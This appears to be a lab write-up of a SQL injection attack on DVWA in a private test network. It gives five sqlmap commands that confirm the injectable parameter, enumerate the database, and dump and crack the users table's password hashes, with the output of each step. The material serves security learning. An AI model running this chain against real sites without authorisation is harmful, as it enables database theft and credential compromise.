# SQL Injection — Offense

For the web attack phase I targeted DVWA (Damn Vulnerable Web Application) running on the target machine. SQL injection was the first web attack — I used sqlmap to automate the full exploitation chain, from confirming the vulnerability all the way to dumping the user credentials from the database.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application | T1213 — Data from Information Repositories

---

## Environment

| | IP |
|---|---|
| Attacker (Kali) | 192.168.56.102 |
| Target (DVWA) | 192.168.56.105 |

**Target URL:** `http://192.168.56.105/dvwa/vulnerabilities/sqli/`
**DVWA Security Level:** Low

---

## Attack Chain — 5 Steps

I ran sqlmap in five progressive steps, each building on the previous result. The `--batch` flag auto-accepts all prompts so the tool runs without manual input, and the session cookie was required since DVWA needs authentication to access the vulnerable page.

---

### Step 1 — Confirm the Injection Point

```bash
sqlmap -u "http://192.168.56.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=$PHPSESSID; security=low" \
--batch
```

sqlmap tested the `id` parameter and confirmed it was injectable using a UNION-based technique. This step proves the vulnerability exists before going further.

> 📸 `screenshots/step1-injection-confirmed.png`

---

### Step 2 — Enumerate Databases

```bash
sqlmap -u "http://192.168.56.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=$PHPSESSID; security=low" \
--batch --dbs
```

**Result — Databases found:**
```
[*] dvwa
[*] information_schema
```

> 📸 `screenshots/step2-databases.png`

---

### Step 3 — Enumerate Tables in the dvwa Database

```bash
sqlmap -u "http://192.168.56.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=$PHPSESSID; security=low" \
--batch -D dvwa --tables
```

**Result — Tables in `dvwa`:**
```
[*] guestbook
[*] users
```

The `users` table was the obvious target for the next step.

> 📸 `screenshots/step3-tables.png`

---

### Step 4 — Enumerate Columns in the users Table

```bash
sqlmap -u "http://192.168.56.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=$PHPSESSID; security=low" \
--batch -D dvwa -T users --columns
```

**Result — Columns in `users`:**
```
user_id   | int
first_name| varchar
last_name | varchar
user      | varchar
password  | varchar
avatar    | varchar
```

> 📸 `screenshots/step4-columns.png`

---

### Step 5 — Dump the users Table

```bash
sqlmap -u "http://192.168.56.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=$PHPSESSID; security=low" \
--batch -D dvwa -T users --dump
```

**Result — Credentials dumped:**
```
user    | password (MD5 hash)
--------|------------------------------------------
admin   | 5f4dcc3b5aa765d61d8327deb882cf99  (password)
gordonb | e99a18c428cb38d5f260853678922e03  (abc123)
1337    | 8d3533d75ae2c3966d7e0d4fcc69216b  (charley)
pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7  (letmein)
smithy  | 5f4dcc3b5aa765d61d8327deb882cf99  (password)
```

sqlmap automatically attempted to crack the MD5 hashes using its built-in dictionary and succeeded on all of them, exposing plaintext passwords.

> 📸 `screenshots/step5-dumped-credentials.png`

---

## What This Demonstrates

Starting from a single injectable parameter in a URL, I was able to enumerate the entire database structure and extract all user credentials in under five commands. The DVWA `security=low` setting represents the worst-case real-world scenario — no input sanitization, no WAF, no parameterized queries — which is still common in legacy or poorly maintained web applications.

---

## 📹 Video Demonstration

🎥 [Watch](#) *(add link)*
